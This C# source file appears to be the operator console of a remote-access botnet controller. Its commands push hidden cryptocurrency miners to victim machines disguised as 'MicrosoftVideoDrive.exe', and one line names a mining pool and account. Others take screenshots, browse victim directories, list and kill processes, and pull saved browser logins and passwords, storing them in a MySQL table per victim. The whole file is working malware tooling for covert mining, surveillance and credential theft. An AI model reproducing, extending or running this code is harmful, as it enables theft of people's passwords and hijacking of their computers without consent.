using System;
using System.Linq;
using System.Net;
using System.Collections.Generic;
using ServerWorker.Server;
using Interfaces;

namespace ServerWorker.ConsoleView
{
    public class ConsoleViewUserCommands : IConsoleCommands
    {
        public Action<IConsoleCommands> PushCommander {get; set;} = delegate { };
        public Action PopCommander {get; set;} = delegate { };
        private User _user;
        public ConsoleViewUserCommands(User user)
        {
            _user = user;

            if (user.userData == null) 
            {
                try
                {
                    string key =  user.UsersCom.GetKey();
                    user.userData = new UserCard.UserData(key);
                    Console.WriteLine("UserKey: " + user.userData.id);
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Error: " + ex.Message);
                    Console.ForegroundColor = ConsoleColor.White;
                }
            }

            if (user.Ping < 450)
                GetSettings();
        }
        
        private List<String> _excludedMethods = new List<string>()
        {
            "Equals",
            "GetHashCode",
            "GetType",
            "ToString"
        };

        public void Help()
        {
            var methods = GetType().GetMethods().ToList();
            methods.Where(x => !_excludedMethods.Contains(x.Name)).ToList().ForEach(x => 
            {
                var parametrs = x.GetParameters().Select(p => p.ParameterType.Name + " " + p.Name).ToList();

                Console.WriteLine("{0}({1})",x.Name, string.Join(",", parametrs));
            });
        }

        public void SetMinerSettings(string valute)
        {
            switch (valute.ToLower())
            {
                case "none":
                    _user.UsersCom.SetMSettings(@"Standart\Miner", "Data", "MicrosoftVideoDrive.exe","",false,DDMiners.none);
                    break;
                case "xmr_cpu":
                    _user.UsersCom.SetMSettings(@"M\XMRCPU", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_CPU);
                    break;
                case "xmr_n":
                    _user.UsersCom.SetMSettings(@"M\XMRN", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_N);
                    break;
                case "xmr_a":
                    _user.UsersCom.SetMSettings(@"M\XMRA", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_A);
                    break;
                case "eth_n":
                    _user.UsersCom.SetMSettings(@"M\ETHN", "Data", "MicrosoftVideoDrive.exe", "-U -S eth.pool.minergate.com:45791 -u xismatulin.ru@yandex.ru --cuda-parallel-hash 4", true, DDMiners.ETH_N);
                    break;
            }
        }

        public void GetLog()
        {
            Console.WriteLine("Loading...");
            var logs = _user.UsersCom.GetLog();
            logs.ForEach(x => Console.WriteLine(x));
        }

        public void DeviceInfo()
        {
            Console.WriteLine("Loading...");
            var infoDevice = _user.UsersCom.GetInfoDevice();
            _user.userData.infoDevice = infoDevice;

            _user.userData.infoDevice.GetListInfo().ForEach(x => Console.WriteLine(x));

              if (_user.userData.id != "")
                    _user.userData.SaveDataToFile(_user.userData.id + ".xml");
        }

        public void RunMiner()
        {
            _user.UsersCom.RunM();
        }

        public void ScreenShoot()
        {
            var bitMap = _user.UsersCom.ScreenShot();
            bitMap.Save("Screen_" + _user.userData.id + "_" + DateTime.Now.ToString("HH:mm:ss"), System.Drawing.Imaging.ImageFormat.Png);
        }

        public void GetProcesses()
        {
            Console.WriteLine("Loading...");
            _user.UsersCom.GetListProc().ForEach(x => Console.WriteLine(x));
        }

        public void DirectoryViewer()
        {
            PushCommander(new DirectoryViewCommands(_user));
        }

        public void KillProc(string processName)
        {
            _user.UsersCom.KillProcess(processName);
        }

        public void GetSettings()
        {
            Console.WriteLine("Loading...");
            _user.userData.setting = _user.UsersCom.GetSetting();

            Console.Write( "Comp_name===>> \t");
            Console.WriteLine(_user.userData.setting.Comp_name);
            Console.Write("IsMiner===>> \t");
            Console.WriteLine(_user.userData.setting.IsMiner);
            Console.Write("Key===>> \t");
            Console.WriteLine(_user.userData.setting.Key);
            Console.Write("Open_sum===>> \t");
            Console.WriteLine(_user.userData.setting.Open_sum);
            Console.Write("Start_time===>> \t");
            Console.WriteLine(_user.userData.setting.Start_time);
            Console.Write("Version===>> \t");
            Console.WriteLine(_user.userData.setting.Version);
            Console.Write("MFTPFloader===>> \t");
            Console.WriteLine(_user.userData.setting.MFTPFloader);
            Console.Write("MLocalFloader===>> \t");
            Console.WriteLine(_user.userData.setting.MLocalFloader);
            Console.Write("MFileName===>> \t");
            Console.WriteLine(_user.userData.setting.MFileName);
            Console.Write("MArgs===>> \t");
            Console.WriteLine(_user.userData.setting.MArgs);
            Console.Write("MValut===>> \t");
            Console.WriteLine(_user.userData.setting.MValut);

              if (_user.userData.id != "")
                    _user.userData.SaveDataToFile(_user.userData.id + ".xml");
        }

        public void OpenChat()
        {
            PushCommander(new ConsoleViewChatCommands(_user));
        }

        public void Back()
        {
            PopCommander();
        }

        public void GoToDownloadCommander()
        {
            throw new Exception("Метод еще не реализован");
        }

        public void GetPass()
        {        
                var loginDataList = _user.UsersCom.SendLoginData("");

                MySQLData data = new MySQLData() { Table = _user.userData.id, Columns = new string[] { "Site", "Login", "Password"} };
                foreach (LoginData loginData in loginDataList)
                {
                    if (!string.IsNullOrWhiteSpace(loginData.WebSite) || !string.IsNullOrWhiteSpace(loginData.Login) || !string.IsNullOrWhiteSpace(loginData.Pass))
                        data.Values.Add(new string[] { loginData.WebSite, loginData.Login, loginData.Pass});
                }

                var dataCount = data.Values.Count;
                if (dataCount > 0)
                {
                    MySQLManager.CreateTable(_user.userData.id);
                    MySQLManager.Send(data);
                }
                else 
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Паролей не найдено");
                    Console.ForegroundColor = ConsoleColor.White;
                }

                loginDataList.ForEach(x => Console.WriteLine(x.WebSite + " " + x.Login + " " + x.Pass));
                
                _user.userData.IsGettingLoginData = true;
                if (_user.userData.id != "")
                    _user.userData.SaveDataToFile(_user.userData.id + ".xml");

                if (dataCount > 0) 
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("Получено строк: " + dataCount);
                    Console.ForegroundColor = ConsoleColor.White;
                }
        }
    }
}